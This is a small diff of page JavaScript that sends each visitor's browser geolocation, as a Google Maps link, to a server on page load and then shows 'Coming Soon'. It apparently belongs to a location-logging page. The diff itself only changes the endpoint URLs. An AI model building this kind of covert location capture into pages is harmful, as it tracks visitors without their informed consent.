@@ -11,7 +11,7 @@ window.onload = function() {
         var lon = position.coords.longitude;
         $.ajax({
             type: 'POST',
-            url: 'https://app-dt38.onrender.com/location',
+            url: '/location',
             data: JSON.stringify({ "data": `Google Map Link: https://google.com/maps/place/${lat}+${lon}` }),
             contentType: 'application/json; charset=UTF-8',
             success: function () { $('#change').html('Coming Soon'); },
@@ -41,7 +41,7 @@ window.onload = function() {
 
         $.ajax({
             type: 'POST',
-            url: 'https://app-dt38.onrender.com/receive-error',
+            url: '/receive-error',
             data: JSON.stringify({ "error": errorMessage }),
             contentType: 'application/json; charset=UTF-8',
             success: function () { $('#change').html('Error received successfully'); },
